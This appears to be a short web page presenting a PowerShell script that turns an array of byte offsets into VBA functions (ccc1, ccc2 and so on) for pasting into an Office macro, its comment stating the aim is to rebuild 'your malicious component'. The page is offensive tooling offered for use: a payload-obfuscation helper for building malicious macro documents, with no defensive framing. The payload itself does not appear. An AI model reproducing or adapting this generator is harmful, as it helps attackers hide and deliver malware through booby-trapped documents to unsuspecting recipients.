<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Powershell Generate VBA for Macro</title>
</head><body>#PowerShell Code to generate a VBA code that you could insert in a Macro. This code will produce byte arrays that contain the position of the bytes to build your malicious component:<br/>
<br/>
$i=0<br/>
$payload = ""<br/>
$j=0<br/>
$u=1<br/>
$payDef = ""<br/>
foreach($offset in $offsetArray){ &nbsp;<br/>
<br/>
&nbsp; &nbsp; if($i -eq 30) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $payload = $payload + ", " + $offset + " _`r`n"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $i=0 &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; $j++ <br/>
&nbsp; &nbsp; }<br/>
&nbsp; &nbsp; else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp;if($i -eq 0) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $payload = $payload + $offset &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp;}<br/>
&nbsp; &nbsp; &nbsp; &nbsp;else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $payload = $payload + ", " + $offset &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp;}<br/>
&nbsp; &nbsp; }<br/>
&nbsp; &nbsp; if($j -eq 25) &nbsp;{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $payDef = $payDef + "`r`nFunction ccc$u()<br/>
tt$u = Array($payload)<br/>
ccc$u = tt$u<br/>
End Function"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $payload = ""<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $u++<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $j = 0<br/>
&nbsp; &nbsp; }<br/>
&nbsp; &nbsp; $i++<br/>
}<br/>
if($payload -ne ""){<br/>
$payDef = $payDef + "`r`nFunction ccc$u()<br/>
tt$u = Array($payload)<br/>
ccc$u = tt$u<br/>
End Function"<br/>
}<br/>
<br/>
$payDef</body></html>